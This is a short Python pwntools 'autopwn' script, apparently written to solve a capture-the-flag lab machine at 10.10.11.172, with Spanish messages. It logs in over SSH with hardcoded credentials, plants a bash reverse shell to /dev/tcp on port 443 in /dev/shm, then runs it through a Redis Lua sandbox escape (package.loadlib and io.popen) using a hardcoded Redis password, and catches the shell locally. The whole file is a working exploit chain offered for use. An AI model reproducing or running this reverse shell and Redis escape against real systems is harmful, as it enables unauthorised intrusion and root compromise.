try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Autopwn Shared ~ GatoGamer1155\n")
except:
    print("\n[\033[1;31m!\033[1;37m] El script necesita privilegios de root\n\n[\033[1;31m!\033[1;37m] Recuerda tener instalada la libreria pwntools\n")
    exit(1)

if len(sys.argv) < 2:
    print(f"[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} <ip>\n")
    exit(1)

if not sys.warnoptions:
    import warnings
    warnings.simplefilter("ignore")

rev = f'echo "export TERM=xterm; cd; bash -i >& /dev/tcp/{sys.argv[1]}/443 0>&1" > /dev/shm/sh'
rto = 'redis-cli --pass F2WHqJUz2WEz=Gqq eval \'local l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = l(); local f = io.popen("cat /dev/shm/sh | bash"); local res = f:read("*a"); f:close(); return res\' 0'

def cmd():
    request = ssh(host='10.10.11.172', user='james_mason', password='Soleil101')
    user = request.process("/bin/sh")
    user.sendline(rev)
    user.recvuntil("$")
    user.sendline(rto)

threading.Thread(target=cmd, args=()).start()
shell = listen(443, timeout=30).wait_for_connection()
shell.interactive()
